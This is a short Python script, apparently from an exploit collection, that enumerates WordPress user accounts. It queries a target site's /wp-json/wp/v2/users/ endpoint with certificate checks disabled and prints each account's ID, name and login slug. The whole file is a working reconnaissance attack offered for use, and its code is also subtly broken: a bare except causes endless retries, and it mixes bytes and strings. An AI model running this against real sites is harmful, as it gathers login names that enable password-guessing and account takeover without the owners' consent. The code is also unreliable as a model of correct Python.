#!/usr/bin/python3
import sys, os, re
import requests, json, urllib3

def Clear():
    os.system("clear")

def Banner():
    print('- Wordpress < 5.3 - User Enumeration \n- SajjadBnd\n')

def Desc():
    url = input("[!] URL >> ")
    vuln = url + "/wp-json/wp/v2/users/"
    while True:
        try:
            r = requests.get(vuln, verify=False)
            content = json.loads(r.text)
            Data(content)
        except:
            vuln = "http://" + vuln


def Data(content):
    for x in content:
        name = x["name"].encode("UTF-8")
        print("=====================")
        print("[+] ID : " + str(x["id"]))
        print("[+] Name : " + name)
        print("[+] User : " + x["slug"])
    sys.exit(1)
        
if __name__=="__main__":
    urllib3.disable_warnings()
    #reload(sys)
    #sys.setdefaultencoding("UTF8")
    #Clear()
    Banner()
    Desc()
    
    

            
